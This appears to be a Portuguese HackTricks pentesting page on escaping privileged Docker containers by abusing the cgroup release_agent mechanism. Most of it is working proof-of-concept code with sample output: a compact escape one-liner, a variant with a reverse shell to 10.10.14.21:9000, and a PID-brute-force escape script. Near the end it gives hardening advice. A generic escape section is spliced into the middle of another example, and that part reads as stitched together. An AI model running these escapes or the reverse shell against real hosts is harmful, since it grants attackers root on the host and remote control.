# `--privileged` flag

{% code title="PoC Inicial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash
 
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="Segundo PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

O sinalizador `--privileged` introduz preocupações significativas de segurança, e o exploit depende do lançamento de um contêiner docker com ele habilitado. Ao usar esse sinalizador, os contêineres têm acesso total a todos os dispositivos e não têm restrições do seccomp, AppArmor e das capacidades do Linux.

Na verdade, `--privileged` fornece permissões muito maiores do que as necessárias para escapar de um contêiner docker por meio deste método. Na realidade, os "únicos" requisitos são:

1. Devemos estar executando como root dentro do contêiner
2. O contêiner deve ser executado com a capacidade do Linux `SYS_ADMIN`
3. O contêiner deve não ter um perfil AppArmor, ou permitir a chamada do sistema `mount`
4. O sistema de arquivos virtual cgroup v1 deve ser montado como leitura-gravação dentro do contêiner

A capacidade `SYS_ADMIN` permite que um contêiner execute a chamada do sistema `mount` \(consulte [man 7 capabilities](https://linux.die.net/man/7/capabilities)\). O Docker inicia contêineres com um conjunto restrito de capacidades por padrão e não habilita a capacidade `SYS_ADMIN` devido aos riscos de segurança envolvidos.

Além disso, o Docker inicia contêineres com a política AppArmor `docker-default` por padrão, o que impede o uso da chamada do sistema `mount` mesmo quando o contêiner é executado com `SYS_ADMIN`.

Um contêiner seria vulnerável a essa técnica se executado com as flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## Quebrando o conceito de prova

Agora que entendemos os requisitos para usar essa técnica e refinamos o exploit do conceito de prova, vamos percorrer linha por linha para demonstrar como ele funciona.

Para acionar esse exploit, precisamos de um cgroup onde possamos criar um arquivo `release_agent` e acionar a invocação do `release_agent` matando todos os processos no cgroup. A maneira mais fácil de fazer isso é montar um controlador cgroup e criar um cgroup filho.

Para fazer isso, criamos um diretório `/tmp/cgrp`, montamos o controlador cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) e criamos um cgroup filho \(nomeado "x" para fins deste exemplo\). Embora nem todos os controladores cgroup tenham sido testados, essa técnica deve funcionar com a maioria dos controladores cgroup.

Se você estiver seguindo e receber "mount: /tmp/cgrp: dispositivo especial cgroup não existe", é porque sua configuração não tem o controlador cgroup RDMA. Altere `rdma` para `memory` para corrigir. Estamos usando RDMA porque o PoC original foi projetado apenas para funcionar com ele.

Observe que os controladores cgroup são recursos globais que podem ser montados várias vezes com permissões diferentes e as alterações renderizadas em uma montagem serão aplicadas a outra.

Podemos ver a criação do cgroup filho "x" e sua listagem de diretórios abaixo.
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
Em seguida, habilitamos as notificações do cgroup na liberação do cgroup "x" escrevendo um 1 em seu arquivo `notify_on_release`. Também definimos o agente de liberação do cgroup RDMA para executar um script `/cmd` - que criaremos posteriormente no contêiner - escrevendo o caminho do script `/cmd` no host para o arquivo `release_agent`. Para fazer isso, vamos obter o caminho do contêiner no host a partir do arquivo `/etc/mtab`.

Os arquivos que adicionamos ou modificamos no contêiner estão presentes no host e é possível modificá-los de ambos os mundos: o caminho no contêiner e o caminho no host.

Essas operações podem ser vistas abaixo:
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Observe o caminho para o script `/cmd`, que vamos criar no host:
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
Agora, criamos o script `/cmd` de forma que ele execute o comando `ps aux` e salve sua saída em `/output` no contêiner, especificando o caminho completo do arquivo de saída no host. No final, também imprimimos o conteúdo do script `/cmd` para ver seus detalhes:
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
Finalmente, podemos executar o ataque gerando um processo que termina imediatamente dentro do cgroup filho "x". Ao criar um processo `/bin/sh` e escrever seu PID no arquivo `cgroup.procs` no diretório do cgroup filho "x", o script no host será executado após a saída do `/bin/sh`. A saída do `ps aux` executado no host é então salva no arquivo `/output` dentro do contêiner:
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# Sinalizador `--privileged` v2

Os PoCs anteriores funcionam bem quando o contêiner é configurado com um driver de armazenamento que expõe o caminho completo do host do ponto de montagem, por exemplo, `overlayfs`. No entanto, recentemente me deparei com algumas configurações que não revelavam claramente o ponto de montagem do sistema de arquivos do host.

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
O [Kata Containers](https://katacontainers.io/) monta por padrão o sistema de arquivos raiz de um contêiner sobre `9pfs`. Isso não revela nenhuma informação sobre a localização do sistema de arquivos do contêiner na Máquina Virtual do Kata Containers.

\* Mais sobre o Kata Containers em um futuro post no blog.
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
Eu vi um container com este root mount em um ambiente ao vivo, acredito que o container estava sendo executado com uma configuração específica de `devicemapper` storage-driver, mas até agora não consegui replicar esse comportamento em um ambiente de teste.

## Uma PoC Alternativa

Obviamente, nesses casos, não há informações suficientes para identificar o caminho dos arquivos do container no sistema de arquivos do host, então a PoC de Felix não pode ser usada como está. No entanto, ainda podemos executar esse ataque com um pouco de engenhosidade.

A única informação chave necessária é o caminho completo, relativo ao host do container, de um arquivo para executar dentro do container. Sem ser capaz de discernir isso a partir dos pontos de montagem dentro do container, temos que procurar em outro lugar.

### Proc para o Resgate <a id="proc-to-the-rescue"></a>

O pseudo-sistema de arquivos `/proc` do Linux expõe as estruturas de dados do processo do kernel para todos os processos em execução em um sistema, incluindo aqueles em diferentes namespaces, por exemplo, dentro de um container. Isso pode ser mostrado executando um comando em um container e acessando o diretório `/proc` do processo no host:Container.
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
Como observação, a estrutura de dados `/proc/<pid>/root` é uma que me confundiu por muito tempo, eu nunca conseguia entender por que ter um link simbólico para `/` era útil, até que eu li a definição real nas páginas do manual:

> /proc/\[pid\]/root
>
> UNIX e Linux suportam a ideia de um root do sistema de arquivos por processo, definido pelo sistema de chamada chroot\(2\). Este arquivo é um link simbólico que aponta para o diretório raiz do processo e se comporta da mesma forma que exe e fd/\*.
>
> No entanto, observe que este arquivo não é apenas um link simbólico. Ele fornece a mesma visão do sistema de arquivos (incluindo namespaces e o conjunto de montagens por processo) que o próprio processo.

O link simbólico `/proc/<pid>/root` pode ser usado como um caminho relativo do host para qualquer arquivo dentro de um contêiner:Container.
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
Este método muda o requisito do ataque de conhecer o caminho completo, em relação ao host do container, de um arquivo dentro do container, para conhecer o pid de _qualquer_ processo em execução no container.

### Pid Bashing <a id="pid-bashing"></a>

Na verdade, esta é a parte fácil, ids de processos no Linux são numéricos e atribuídos sequencialmente. O processo `init` é atribuído ao pid `1` e todos os processos subsequentes são atribuídos a ids incrementais. Para identificar o pid do processo host de um processo dentro de um container, pode ser usada uma busca incremental de força bruta: Container
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Escapando de um Container Docker

Se você conseguir escapar de um contêiner Docker, poderá acessar o host subjacente. Isso pode ser especialmente perigoso se o host for um servidor de produção.

## Verificando se estamos em um contêiner Docker

Para verificar se estamos em um contêiner Docker, podemos executar o seguinte comando:

```bash
$ cat /proc/1/cgroup | grep -q docker && echo "I'm inside a Docker container"
```

Se o comando imprimir "I'm inside a Docker container", estamos dentro de um contêiner Docker.

## Escapando do contêiner

### Método 1: Montando o diretório raiz do host

Se o contêiner estiver sendo executado com a opção `--privileged`, poderemos montar o diretório raiz do host dentro do contêiner. Para fazer isso, execute o seguinte comando:

```bash
$ docker run -v /:/mnt --privileged -it alpine chroot /mnt sh
```

Isso montará o diretório raiz do host em `/mnt` dentro do contêiner e, em seguida, mudará o diretório raiz do contêiner para `/mnt`. Agora estamos dentro do diretório raiz do host e podemos fazer o que quisermos.

### Método 2: Usando um contêiner de host

Se o contêiner estiver sendo executado com a opção `--pid=host`, poderemos acessar todos os processos do host. Para fazer isso, execute o seguinte comando:

```bash
$ docker run -it --pid=host --privileged alpine
```

Isso iniciará um contêiner Alpine com acesso a todos os processos do host. Agora podemos fazer o que quisermos com esses processos.

### Método 3: Usando um contêiner de rede

Se o contêiner estiver sendo executado com a opção `--net=host`, poderemos acessar a rede do host. Para fazer isso, execute o seguinte comando:

```bash
$ docker run -it --net=host --privileged alpine
```

Isso iniciará um contêiner Alpine com acesso à rede do host. Agora podemos fazer o que quisermos com essa rede.

## Prevenção

Para evitar que um invasor escape de um contêiner Docker, siga estas práticas recomendadas:

- Não execute contêineres com a opção `--privileged` a menos que seja absolutamente necessário.
- Não execute contêineres com a opção `--pid=host` a menos que seja absolutamente necessário.
- Não execute contêineres com a opção `--net=host` a menos que seja absolutamente necessário.
- Use namespaces de contêiner para limitar o acesso do contêiner a recursos do host.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### Colocando Tudo Junto <a id="putting-it-all-together"></a>

Para completar este ataque, a técnica de força bruta pode ser usada para adivinhar o pid para o caminho `/proc/<pid>/root/payload.sh`, com cada iteração escrevendo o caminho pid adivinhado para o arquivo `release_agent` dos cgroups, acionando o `release_agent` e verificando se um arquivo de saída é criado.

A única ressalva com esta técnica é que ela não é de forma alguma sutil e pode aumentar muito o número de pids. Como nenhum processo de longa duração é mantido em execução, isso _não deveria_ causar problemas de confiabilidade, mas não me cite sobre isso.

O PoC abaixo implementa essas técnicas para fornecer um ataque mais genérico do que o apresentado inicialmente no PoC original de Felix para escapar de um contêiner privilegiado usando a funcionalidade `release_agent` dos cgroups:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Executar o PoC dentro de um container privilegiado deve fornecer uma saída semelhante a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Use containers securely

O Docker restringe e limita os contêineres por padrão. Afrouxar essas restrições pode criar problemas de segurança, mesmo sem o poder total da flag `--privileged`. É importante reconhecer o impacto de cada permissão adicional e limitar as permissões em geral ao mínimo necessário.

Para ajudar a manter os contêineres seguros:

* Não use a flag `--privileged` ou monte um [socket Docker dentro do contêiner](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). O socket do Docker permite a criação de contêineres, então é uma maneira fácil de assumir o controle total do host, por exemplo, executando outro contêiner com a flag `--privileged`.
* Não execute como root dentro do contêiner. Use um [usuário diferente](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) ou [namespaces de usuário](https://docs.docker.com/engine/security/userns-remap/). O root no contêiner é o mesmo que no host, a menos que seja remapeado com namespaces de usuário. Ele é apenas levemente restrito por, principalmente, namespaces do Linux, capacidades e cgroups.
* [Descarte todas as capacidades](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) e habilite apenas aquelas que são necessárias (`--cap-add=...`). Muitas cargas de trabalho não precisam de nenhuma capacidade e adicioná-las aumenta o escopo de um possível ataque.
* [Use a opção de segurança "no-new-privileges"](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) para impedir que processos ganhem mais privilégios, por exemplo, por meio de binários suid.
* [Limite os recursos disponíveis para o contêiner](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Limites de recursos podem proteger a máquina de ataques de negação de serviço.
* Ajuste os perfis [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (ou SELinux) para restringir as ações e syscalls disponíveis para o contêiner ao mínimo necessário.
* Use [imagens Docker oficiais](https://docs.docker.com/docker-hub/official_images/) ou construa as suas próprias com base nelas. Não herde ou use imagens [comprometidas](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/).
* Reconstrua regularmente suas imagens para aplicar correções de segurança. Isso vai sem dizer.

# Referências

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
